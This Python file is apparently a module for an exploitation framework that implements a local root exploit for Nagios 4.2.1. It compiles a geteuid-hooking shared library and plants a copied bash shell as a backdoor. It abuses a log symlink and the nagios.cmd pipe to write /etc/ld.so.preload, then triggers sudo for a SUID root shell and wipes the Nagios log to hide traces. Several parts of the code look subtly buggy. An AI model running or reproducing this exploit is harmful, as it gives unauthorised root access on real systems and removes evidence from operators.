import calendar
import os
import stat
import subprocess
import sys
import time
from os import system, path
from subprocess import Popen, PIPE
from time import sleep

from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    BACKDOORSH = "/bin/bash"
    BACKDOORPATH = "/tmp/nagiosrootsh"
    PRIVESCLIB = "/tmp/nagios_privesc_lib.so"
    PRIVESCSRC = "/tmp/nagios_privesc_lib.c"
    SUIDBIN = "/usr/bin/sudo"
    commandfile = '/usr/local/nagios/var/rw/nagios.cmd'
    preload_file_name = "/etc/ld.so.preload"

    def __init__(self):
        info = {"Name": "Nagios Root",
                "Author": "Antonio Marcos",
                "Description": "nagios local root exploit 4.2.1",
                "Reference": "https://www.exploit-db.com/exploits/40921/",
                "Acknowledgements": "Dawid Golunski"
                }
        options = {
            "nagios_path": ["Path to nagios binary", "/usr/local/nagios/bin/", True],
            "nagios_error_log": ["Path to nagios error log", "/usr/local/nagios/var/nagios.log", True]
        }
        compatible = []

        super(BoomerModule, self).__init__(options, info, compatible)

    def cleanexit(self):
        # Cleanup 
        self.print_info("Cleaning up...")
        error_log = self.options["nagios_error_log"][1]
        subprocess.run(["rm", "-f", self.PRIVESCSRC], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["rm", "-f", self.PRIVESCLIB], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["rm", "-f", self.BACKDOORPATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["rm", "-f", str(error_log)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["touch", str(error_log)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if self.check_file_exists(self.preload_file_name):
            subprocess.run(["echo", "-n", ">", self.preload_file_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        self.print_info("Job done. Exiting")

    def ctrl_c(self, signal, frame):
        self.print_info("Ctrl+C pressed")
        cleanexit()

    def check(self):
        try:
            nagios_path = str(self.options["nagios_path"][1]) + "nagios"
            self.print_info(f"Nagios path: {nagios_path}")
            response = Popen([nagios_path, "--version"], stdout=PIPE, stderr=PIPE).communicate()[0]
            version = str(response).split("\\n")[1].strip()
            version = str(version)
            if "4.2.1" in version:
                self.print_ok("Vulnerable")
            else:
                self.print_error("No Vulnerable")
        except Exception as e:
            self.print_error(e)

    def run(self):
        try:
            # [Initialization]
            self.init_validations()
            # [ Exploitation ]
            # Pre-explotation
            self.pre_explotation()
            # Explotation
            self.explotation()
            # [ Root check]
            self.check_root()
            # [ Run exploit]
            self.clean_and_exploit()

        except Exception as e:
            self.cleanexit()
            self.print_error(e)

    def init_validations(self):
        user_id = Popen(["id"], stdout=PIPE, stderr=PIPE).communicate()[0]
        self.print_info("Starting the exploit as: \n" + user_id.decode('utf-8').strip())
        if "nagios" not in str(user_id):
            self.print_warn("You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.")
            sys.exit(3)

        error_log = self.options["nagios_error_log"][1]
        if not self.check_file_exists(error_log):
            self.print_warn(
                f"Provided Nagios log path ({error_log}) doesn't exist. Try again. E.g: "
            )
            print("/usr/local/nagios/var/nagios.log")
            sys.exit(3)

    def pre_explotation(self):
        self.print_info(f"Compiling the privesc shared library ({self.PRIVESCSRC})")
        with open(self.PRIVESCSRC, "w") as libhax:
            libhax.write('''
        #define _GNU_SOURCE
        #include <stdio.h>
        #include <sys/stat.h>
        #include <unistd.h>
        #include <dlfcn.h>
               #include <sys/types.h>
               #include <sys/stat.h>
               #include <fcntl.h>

        uid_t geteuid(void) {
	        static uid_t  (*old_geteuid)();
	        old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	        if ( old_geteuid() == 0 ) {
		        chown("$BACKDOORPATH", 0, 0);
		        chmod("$BACKDOORPATH", 04777);
		        unlink("/etc/ld.so.preload");
	        }
	        return old_geteuid();
        }
        ''')
        stdout, stderr = Popen(["gcc", "-Wall", "-fPIC", "-shared", "-o", self.PRIVESCLIB, self.PRIVESCSRC, "-ldl"],
                               stdout=PIPE, stderr=PIPE).communicate()
        if (str(stdout) != None and str(stderr) != None) and (
                stdout.decode('utf-8') != "" or stderr.decode('utf-8') != ""):
            self.print_warn(f"Failed to compile the privesc lib {self.PRIVESCSRC}.")
            self.cleanexit()
            sys.exit(2)

    def explotation(self):
        subprocess.run(["cp", self.BACKDOORSH, self.BACKDOORPATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        backdoor_path = \
            Popen(["ls", "-l", self.BACKDOORPATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
        self.print_info("Backdoor/low-priv shell installed at: \n" + backdoor_path.decode('utf-8').strip())

        # Safety check
        if self.check_file_exists(self.preload_file_name):
            self.print_warn("/etc/ld.so.preload already exists. Exiting for safety.")
            self.cleanexit()
            sys.exit(2)

        # Symlink the Nagios log file
        error_log = self.options["nagios_error_log"][1]
        stdout, stderr = Popen(
            f"rm -f {error_log} && ln -s {self.preload_file_name} {error_log}",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()
        if (str(stdout) != None and str(stderr) != None) and (
                stdout.decode('utf-8') != "" or stderr.decode('utf-8') != ""):
            self.print_warn(f"Couldn't remove the {error_log} file or create a symlink.")
            self.cleanexit()
            sys.exit(3)

        symlynk_path = Popen(["ls", "-l", error_log], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
        self.print_info(
            "The system appears to be exploitable (writable logdir) ! :) Symlink created at: \n" + symlynk_path.decode(
                'utf-8').strip())

        # Starting real explotation
        self.print_info("Waiting for Nagios service to get restarted...")
        response = input("Do you want to shutdown the Nagios daemon to speed up the restart process? ;) [y/N] ")

        if response.upper() == "Y":
            command = "/usr/bin/printf \"[%lu] SHUTDOWN_PROGRAM\\n\" `date +%s` > " + self.commandfile
            stdout, stderr = Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
        sleep(3)

        nagios_process = \
            Popen("ps aux | grep -v grep | grep -i 'bin/nagios'", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                  shell=True).communicate()[0]
        if nagios_process != None and nagios_process.decode('utf-8') != "":
            self.print_info("Nagios stopped. Shouldn't take long now... ;)")

        while True:
            sleep(1)
            if not self.check_file_exists(self.preload_file_name):
                error_log = self.options["nagios_error_log"][1]
                subprocess.run(["rm", "-f", str(error_log)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                break

        preload_privileges = Popen(
            f"ls -l {self.preload_file_name}",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()[0]
        self.print_info(
            (
                    f"Nagios restarted. The {self.preload_file_name}"
                    + " file got created with the privileges: \n"
                    + preload_privileges.decode('utf-8')
            )
        )
        sleep(3)  # Wait for Nagios to create the nagios.cmd pipe

        is_pipe = stat.S_ISFIFO(os.stat(self.commandfile).st_mode)
        if not is_pipe:
            self.print_warn(f"Nagios command pipe {self.commandfile} does not exist!")
            sys.exit(2)

        self.print_info(
            f"Injecting {self.PRIVESCLIB} via the pipe nagios.cmd to bypass lack of write perm on ld.so.preload"
        )
        now = calendar.timegm(time.gmtime())
        command = "/usr/bin/printf \\\"[%lu] NAGIOS_GIVE_ME_ROOT_NOW!;; " + self.PRIVESCLIB + "\\\n\\\" " + str(
            now) + " > " + self.commandfile
        stdout, stderr = Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
        sleep(1)

        stdout = Popen(
            f"grep -q {self.PRIVESCLIB} {self.preload_file_name}",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()[0]
        if stdout is None or stdout.decode('utf-8').strip() == "":
            result = Popen(
                f"cat {self.preload_file_name}"
                + " | grep \""
                + self.PRIVESCLIB
                + "\"",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
            ).communicate()
            self.print_info(
                f"The {self.preload_file_name}"
                + " file now contains: \n"
                + result[0].decode('utf-8')
            )
        else:
            self.print_warn(f"Unable to inject the lib to {self.preload_file_name}")
            sys.exit(2)

        self.print_info(
            f"Triggering privesc code from {self.PRIVESCLIB} by executing {self.SUIDBIN} SUID binary"
        )
        Popen("sudo 2>/dev/null >/dev/null", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()

    def check_root(self):
        result = Popen(
            f"ls -l {self.BACKDOORPATH} | grep rws | grep -q root 2>/dev/null",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()[0]
        root_check = Popen(
            f"ls -l {self.BACKDOORPATH}",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()[0]
        if result is None or result.decode('utf-8') == "":
            self.print_info("Rootshell got assigned root SUID perms at: \n" + root_check.decode('utf-8'))
            self.print_ok("Got root via Nagios!")
        else:
            self.print_ko("Failed to get root: \n" + root_check.decode('utf-8'))
            self.cleanexit()
            sys.exit(2)

    def clean_and_exploit(self):
        clean = Popen(self.BACKDOORPATH + "-p -c \"rm -f " + self.preload_file_name + "; rm -f " + self.PRIVESCLIB,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()[0]
        error_log = self.options["nagios_error_log"][1]
        subprocess.run(["rm", "-f", str(error_log)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        Popen(
            f"echo > {error_log}",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        ).communicate()[0]

        # Execute the rootshell
        self.print_ok(f"Nagios pwned. Spawning the rootshell {self.BACKDOORPATH} now")
        system(f"{self.BACKDOORPATH} -p -i")

    def check_file_exists(self, file_path):
        return file_path != None and file_path != "" and path.exists(file_path) == True and path.isfile(
            file_path) == True


if __name__ == "__main__":
    boomer_nagios = BoomerModule()
    boomer_nagios.cleanexit()
    boomer_nagios.run()
